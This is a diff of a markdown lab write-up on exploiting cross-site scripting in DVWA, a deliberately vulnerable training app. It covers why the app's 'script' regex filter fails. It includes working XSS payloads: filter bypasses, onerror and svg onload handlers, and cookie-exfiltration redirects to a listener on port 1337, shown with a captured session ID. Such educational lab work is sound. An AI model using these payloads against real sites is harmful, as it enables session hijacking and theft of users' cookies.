@@ -2,100 +2,74 @@
 
 ## Vulnerability Overview
 
-At the high-security level in DVWA, Cross-Site Scripting (XSS) attempts to be mitigated through a basic filtering mechanism using `preg_replace()`. This filter is designed to remove any input containing the word "script" in a case-insensitive manner. However, this approach has significant weaknesses:
+At the high-security level, DVWA attempts to prevent Cross-Site Scripting (XSS) by applying a basic filter using `preg_replace()`. This filter is designed to remove any part of the input that matches the word `script`, targeting typical `<script>` tags.
 
-- The filter only targets the exact word "script", ignoring other forms of JavaScript injection.
-- Modified or nested tags can easily bypass the filter.
-- The application directly reflects user input without proper output encoding.
-- HTTP headers explicitly disable browser-based XSS protection with `X-XSS-Protection: 0`.
+### Weakness of the Filtering Method
+- The filtering is case-insensitive but only looks for the word `script`.
+- It does not sanitize other forms of JavaScript injection.
+- The application reflects modified input directly into the page without proper encoding.
+- The HTTP header disables the browser's built-in XSS protection (`X-XSS-Protection: 0`).
 
-These issues make DVWA vulnerable to both reflected and stored XSS attacks even at higher security levels.
+### Summary
+Even though DVWA attempts to block script-based XSS with regex filtering, the protection is ineffective due to poor sanitization and output encoding. This makes the application highly vulnerable to modern XSS attacks.
 
 ---
 
 # Exploitation
 
-## Low Security Level
+## 1. Triggering JavaScript Execution via XSS
 
-### Source Code Analysis
-- No XSS protection implemented.
-- User input is directly reflected into the webpage.
-
-### Payloads
-
-1. Basic Alert Injection:
-```html
-<script>alert("You have been hacked")</script>
-```
-- Triggers a JavaScript alert when the page is loaded.
-
-2. Cookie Theft:
-```html
-<script>alert(document.cookie)</script>
-```
-- Displays the current session cookie via an alert.
-
-3. Cookie Exfiltration:
-```html
-<script>window.location='http://127.0.0.1:1337/?cookie='+document.cookie</script>
-```
-- Redirects the user's browser to an attacker-controlled server, sending the cookie as a query parameter.
-
----
-
-## Medium Security Level
-
-### Source Code Analysis
-- The application attempts to replace the word "script" in the input.
-- Does not account for closing tags or nested tags, allowing payloads to bypass the filter.
-
-### Payloads
-
-1. Case Variation Bypass:
-```html
-<SCRIPT>alert(document.cookie)</SCRIPT>
-```
-- Bypasses simple case-sensitive filtering.
-
-2. Nested Tag Bypass:
-```html
-<scr<script>ipt>alert("You have been hacked")</script>
-```
-- Breaks up the keyword "script" to evade detection.
-
----
-
-## High Security Level
-
-### Source Code Analysis
-- Improved filtering, but vulnerable to more sophisticated payloads using event handlers.
-
-### Payloads
-
-1. Basic Onerror Exploit:
+**Payload Used:**
 ```html
 <img src=x onerror="alert('You have been hacked')">
 ```
 
-2. Cookie Stealing with Onerror:
+This payload uses an `<img>` tag with an invalid `src` attribute, causing a loading error and triggering the `onerror` event. The event executes JavaScript that displays an alert message "You have been hacked".
+
+The payload was reflected in the HTML source code, confirming that arbitrary script execution was possible.
+
+---
+
+## 2. Capturing the Victim’s Session Cookie
+
+**Payload Used:**
 ```html
 <img src/onerror=alert(document.cookie)>
 ```
 
-3. Redirect and Exfiltrate Cookie:
-```html
-<script>window.location='http://127.0.0.1:1337/?cookie='+document.cookie</script>
-```
-
-4. Alternate Redirect using Image:
-```html
-<img src=/ onerror="window.location='http://127.0.0.1:1337/?cookie='+document.cookie">
-```
-
-These payloads demonstrate that even at high-security settings, DVWA can still be exploited for XSS attacks using creative techniques.
+This payload demonstrates how an attacker could use XSS to steal a user's session cookie.
+- When a victim accesses a URL with this payload, an alert pops up displaying the session cookie.
+- In a real-world attack, this method could be combined with phishing to hijack user sessions.
 
 ---
 
-# ✅ Conclusion
+## 3. Exfiltrating Cookies to an Attacker-Controlled Server
 
-DVWA's XSS module, even at the High security level, remains vulnerable due to insufficient input validation and lack of proper output encoding. Exploitation techniques range from simple script injection to advanced payload crafting using event handlers and nested tags.
+**Payload Used:**
+```html
+<svg onload="window.location='http://127.0.0.1:1337/?cookie='+document.cookie">
+```
+
+This advanced payload exfiltrates the session cookie to an external server.
+
+### Steps Taken:
+1. A local HTTP server was started on port 1337 using the following command:
+```bash
+python -m http.server 1337
+```
+2. When the payload executed in the victim's browser, it redirected to the attacker's server with the cookie attached as a query string.
+
+### Result:
+- Successfully captured the victim's session ID and cookie data.
+- Example server log output:
+```text
+127.0.0.1 - - [25/Mar/2025 14:58:05] "GET /?cookie=security=high;%20PHPSESSID=p7l63b0bklhsret7raqdjfgpcv HTTP/1.1" 200 -
+127.0.0.1 - - [25/Mar/2025 14:58:05] "GET /favicon.ico HTTP/1.1" 404 -
+```
+- This confirms that the attacker's server received the session cookie, enabling potential session hijacking.
+
+---
+
+# ✅ Done!
+
+This concludes the Cross-site Scripting (XSS) exploitation on DVWA at high security level.
